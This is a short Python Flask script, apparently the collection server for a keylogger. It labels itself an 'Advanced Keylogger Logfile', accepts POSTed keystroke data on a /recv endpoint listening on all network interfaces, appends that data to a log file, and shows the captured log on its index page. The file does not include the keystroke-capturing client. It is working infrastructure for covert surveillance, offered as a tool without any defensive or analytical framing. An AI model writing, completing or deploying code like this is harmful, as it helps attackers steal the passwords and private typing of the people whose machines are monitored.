from flask import Flask, render_template, request

app = Flask(__name__)

def set_mode():
    try:
        mode = int(input("Enter option (1 for keylogger): "))

        if mode == 1:
            with open('logfile', 'w') as logfile:
                logfile.write('Advanced Keylogger Logfile:\n')
        else:
            print("Invalid mode selected...")
            exit()
    except Exception as e:
        print(f"Error: {e}")

    return

@app.route('/recv', methods=['POST'])
def receive():
    try:
        data = request.form.get('data')

        if not data:
            return "No 'data' received", 400

        print(f"Received: {data}")

        with open('logfile', 'a') as logfile:
            logfile.write(data + '\n')

        return "Logged..."
    except Exception as e:
        print(f"Receiving error: {e}")
        return f"Error: {e}", 500

@app.route('/')
def index():
    with open('logfile', 'r') as readlog:
        data = readlog.readlines()
    
    return render_template('index.html', data=data)

if __name__ == "__main__":
    set_mode()
    app.run(port=5000, host="0.0.0.0")